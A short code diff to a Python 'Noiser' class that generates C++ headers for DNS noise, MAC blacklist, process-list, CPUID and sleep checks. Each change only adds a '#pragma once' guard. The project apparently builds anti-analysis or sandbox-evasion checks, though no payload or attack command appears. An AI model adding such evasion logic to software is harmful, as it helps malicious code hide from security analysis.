@@ -32,7 +32,7 @@ class Noiser:
                 tld = ', '.join(["\"" + i.strip('\n') + "\""  for i in rf.readlines()]) 
             dns_path = os.path.join(self.include_path, FILENAME_DNS_NOISE_HEADER) 
             with open(dns_path, "w") as f:
-                f.write("#include <vector>\n#include <string>\n\n")
+                f.write("#pragma once\n\n#include <vector>\n#include <string>\n\n")
                 f.write(TEMPLATE_DNS_NOISE_WORDLIST_ARG.format(wordlist))
                 f.write(TEMPLATE_DNS_NOISE_TLD_ARG.format(tld))
 
@@ -55,7 +55,7 @@ class Noiser:
                 real_dns = ', '.join(["\"" + i.strip('\n') + "\""  for i in rf.readlines()])
             dns_path = os.path.join(self.include_path, FILENAME_DNS_ANALYSIS_HEADER) 
             with open(dns_path, "w") as f:
-                f.write("#include <vector>\n#include <string>\n\n")
+                f.write("#pragma once\n\n#include <vector>\n#include <string>\n\n")
                 f.write(TEMPLATE_DNS_ANALYSIS_FAKE_ARG.format(fake_dns))
                 f.write(TEMPLATE_DNS_ANALYSIS_REAL_ARG.format(real_dns))
 
@@ -66,7 +66,7 @@ class Noiser:
             mac_blacklist_path = os.path.join(self.include_path, FILENAME_MAC_ANALYSIS_HEADER)
             with open(mac_blacklist_path, "w") as wf:
                 mac_blacklist = ', '.join(["\"" + i.strip('\n') + "\""  for i in analysis.blacklist])
-                wf.write("#include <vector>\n#include <string>\n\n")
+                wf.write("#pragma once\n\n#include <vector>\n#include <string>\n\n")
                 wf.write(TEMPLATE_MAC_ANALYSIS_ARG.format(mac_blacklist))
 
         elif analysis_type == CPUIDAnalysis:
@@ -80,7 +80,7 @@ class Noiser:
             process_list = "".join([f"\"{i}\",\n" for i in analysis.process_list])
             process_list_path = os.path.join(self.include_path, FILENAME_PROCESS_ANALYSIS)
             with open(process_list_path, "w") as wf:
-                wf.write("#include <vector>\n#include <string>\n\n")
+                wf.write("#pragma once\n\n#include <vector>\n#include <string>\n\n")
                 wf.write(TEMPLATE_PROCESS_ANALYSIS_ARG.format(process_list))
 
         elif analysis_type == SleepAnalysis:
